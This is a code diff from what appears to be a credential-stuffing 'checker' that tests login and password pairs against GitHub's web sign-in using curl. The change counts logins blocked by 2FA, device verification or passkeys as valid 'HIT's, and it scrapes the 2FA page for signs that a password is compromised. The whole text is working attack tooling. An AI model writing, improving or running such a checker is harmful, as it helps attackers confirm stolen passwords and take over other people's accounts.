@@ -3061,18 +3061,34 @@ async function checkGitHubWeb(login: string, password: string): Promise<CheckRes
     ], 20_000);
 
     const loc = (sessionRes.location ?? "").toLowerCase();
+    const rawLoc = sessionRes.location ?? "";
 
-    // 2FA required
+    // 2FA required — password IS correct, just blocked by 2FA
     if (loc.includes("two-factor") || loc.includes("sessions/two-factor") || sessionRes.body.includes("two-factor")) {
-      return { credential, login, status: "ERROR", detail: "2fa_requerido" };
+      // Follow the 2FA redirect to detect "weak or compromised password" warning
+      try {
+        const twoFaUrl = rawLoc.startsWith("http")
+          ? rawLoc
+          : `https://github.com${rawLoc || "/sessions/two-factor"}`;
+        const twoFaRes = await runCurl([
+          "-L", "-c", cookieFile, "-b", cookieFile,
+          "-H", `User-Agent: ${GH_UA}`,
+          twoFaUrl,
+        ], 10_000);
+        const body = twoFaRes.body.toLowerCase();
+        if (body.includes("weak") || body.includes("compromised") || body.includes("password_reset") || body.includes("change your password")) {
+          return { credential, login, status: "HIT", detail: `HIT:2FA+SENHA_COMPROMETIDA | user:${login}` };
+        }
+      } catch { /* non-fatal — fallthrough to generic 2FA HIT */ }
+      return { credential, login, status: "HIT", detail: `HIT:2FA_REQUERIDO | user:${login}` };
     }
-    // Device verification
+    // Device verification — password IS correct, device not trusted
     if (loc.includes("device-verification") || loc.includes("verified-device")) {
-      return { credential, login, status: "ERROR", detail: "verificacao_dispositivo" };
+      return { credential, login, status: "HIT", detail: `HIT:VERIFICACAO_DISPOSITIVO | user:${login}` };
     }
-    // WebAuthn / passkey
+    // WebAuthn / passkey — password IS correct, passkey blocks
     if (loc.includes("webauthn") || loc.includes("passkey")) {
-      return { credential, login, status: "ERROR", detail: "passkey_requerido" };
+      return { credential, login, status: "HIT", detail: `HIT:PASSKEY_REQUERIDO | user:${login}` };
     }
     // Redirect to home or dashboard → HIT
     if (sessionRes.statusCode === 302 && (loc === "/" || loc.includes("github.com/") || loc.includes("/dashboard") || !loc.includes("login"))) {
